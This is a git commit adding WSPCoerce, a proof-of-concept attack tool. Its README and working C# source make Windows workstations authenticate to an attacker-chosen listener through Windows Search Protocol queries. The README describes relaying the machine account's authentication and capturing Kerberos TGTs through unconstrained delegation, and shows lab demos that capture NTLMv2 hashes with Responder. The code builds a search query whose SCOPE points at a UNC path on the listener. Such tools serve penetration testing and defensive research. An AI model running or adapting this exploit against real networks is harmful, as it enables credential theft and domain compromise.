b2b9067385803302800c3dbf76147c67aebcdfd3
Simon Lemire <lemire.simon@gmail.com>
2023-07-26 16:50:39 -0400

    First commit

--- README.md
+++ README.md
@@ -1,2 +1,63 @@
 # WSPCoerce
+
 PoC to coerce authentication from Windows hosts using MS-WSP
+
+## What is this?
+
+It's a tool to interact with remote hosts using the Windows Search Protocol and coerce authentication. The target host will connect over SMB to the listener host using the machine account.
+
+## What can I do with this?
+
+- Relay the authentication from the target to another system (if SMB signing is disabled)
+- Obtain the TGT of the target (if coercing to a system where unconstrained delegation is enabled)
+
+## What are the requirements?
+
+- Must be running in the context of a domain user (no specific privileges required on target system AFAIK)
+- 445/TCP open on the target system
+- 445/TCP open on the listener system
+- Windows Search Service running on the target system
+
+Note: The Windows Search Service is *NOT* enabled by default on Windows Server so in practice this attack is only effective against Windows workstations.
+
+## How do I compile this?
+
+```
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe WSPCoerce.cs
+```
+
+## How do I run this?
+
+```
+WSPCoerce.exe <target> <listener>
+```
+
+Notes:
+- Can't use an IP address for the target
+- Make sure to use a hostname or FQDN for the listener if you want to receive Kerberos auth
+
+## Example demo 1 - Machine account NTLMv2 capture
+
+Target: LABWS1
+Listener: Kali box
+
+Search request sent to LABWS1:
+![](demo/wsp_2.png)
+
+NTLMv2 captured on Responder:
+![](demo/wsp_labws1_ntlmv2.png)
+
+## Example demo 2 - Coercion to unconstrained delegation
+
+Target: LABWS1
+Listener: LABSRV1
+
+Search request sent to LABWS1:
+![](demo/wsp_1.png)
+
+Packet capture of the request:
+![](demo/wsp_wireshark.png)
+
+Kerberos TGT on listener (LABSRV1):
+![](demo/wsp_tgt_1.png)
+
---
+++ WSPCoerce.cs
@@ -0,0 +1,67 @@
+﻿using System;
+using System.Data.OleDb;
+
+namespace WSPCoerce
+{
+    class Program
+    {
+        const string connectionString = "Provider=Search.CollatorDSO;Extended Properties=\"Application=Windows\"";
+
+        static void ExecuteQuery(string query)
+        {
+            OleDbDataReader myDataReader = null;
+            OleDbConnection myOleDbConnection = new OleDbConnection(connectionString);
+            OleDbCommand myOleDbCommand = new OleDbCommand(query, myOleDbConnection);
+            try
+            {
+                myOleDbConnection.Open();
+                myDataReader = myOleDbCommand.ExecuteReader();
+            }
+            catch (System.Data.OleDb.OleDbException oleDbException)
+            {
+                if ((uint)oleDbException.ErrorCode == 0x80040718L) {
+                    Console.WriteLine("[+] OleDbException - Error 0x{0:X}L", oleDbException.ErrorCode);
+                    Console.WriteLine("[+] Search query successfully sent to the target");
+                }
+                else {
+                    Console.WriteLine("[-] OleDbException - Error 0x{0:X}L", oleDbException.ErrorCode);
+                    for (int i = 0; i < oleDbException.Errors.Count; i++)
+                    {
+                        Console.WriteLine("    Message: " + oleDbException.Errors[i].Message);
+                    }
+                }
+            }
+            finally
+            {
+                if (myDataReader != null)
+                {
+                    myDataReader.Close();
+                    myDataReader.Dispose();
+                }
+                if (myOleDbConnection.State == System.Data.ConnectionState.Open)
+                {
+                    myOleDbConnection.Close();
+                }
+            }
+        }
+
+        static void Main(string[] args)
+        {
+            if (args.Length != 2)
+            {
+                Console.WriteLine("WSPCoerce.exe <target> <listener>");
+                return;
+            }
+
+            string target = args[0];
+            string listener = args[1];
+
+            string query = "SELECT TOP 10 System.ItemFolderPathDisplay, System.ItemName FROM "
+                + target
+                + ".SystemIndex WHERE SCOPE='file:////"
+                + listener
+                + "/SomeFolder'";
+            ExecuteQuery(query);
+        }
+    }
+}
